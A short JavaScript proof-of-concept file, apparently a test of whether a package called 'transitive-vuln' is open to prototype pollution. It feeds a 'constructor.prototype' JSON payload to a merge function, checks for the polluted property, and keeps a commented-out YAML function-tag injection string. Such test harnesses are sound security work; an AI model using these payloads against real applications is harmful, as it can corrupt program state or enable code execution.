const { myDefaultsDeep } = require("transitive-vuln");

const payload = '{"constructor": {"prototype": {"a0": true}}}'
//vulnerableFunc(`{ toString: !<tag:yaml.org,2002:js/function> 'function (){console.log( Date.now())}' } : 1`);
myDefaultsDeep(payload)


if (({})[`a0`] === true) {
    console.log(`Vulnerable to Prototype Pollution via ${payload}`);
}


console.log("Simple Program Executed!");
